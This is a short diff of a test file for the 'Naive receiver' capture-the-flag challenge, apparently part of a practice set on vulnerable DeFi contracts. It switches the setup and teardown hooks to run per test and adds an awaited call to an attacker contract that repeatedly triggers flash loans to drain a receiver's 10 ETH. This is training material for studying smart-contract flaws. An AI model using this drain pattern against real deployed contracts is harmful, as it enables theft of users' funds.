@@ -11,7 +11,7 @@ describe('[Challenge] Naive receiver', function () {
     // Receiver has 10 ETH in balance
     const ETHER_IN_RECEIVER = 10n * 10n ** 18n;
 
-    before(async function () {
+    beforeEach(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, user, player] = await ethers.getSigners();
 
@@ -48,12 +48,12 @@ describe('[Challenge] Naive receiver', function () {
         const Attacker = await ethers.getContractFactory('NaiveReceiverAttacker', deployer);
         const attacker = await Attacker.deploy();
 
-        ///
-        attacker.attack(10, pool.address,receiver.address,'0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',1000n * 10n ** 18n,'0x');
+    
+       await attacker.attack(10, pool.address,receiver.address,'0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',1000n * 10n ** 18n,'0x');
 
     });
 
-    after(async function () {
+    afterEach(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
         // All ETH has been drained from the receiver
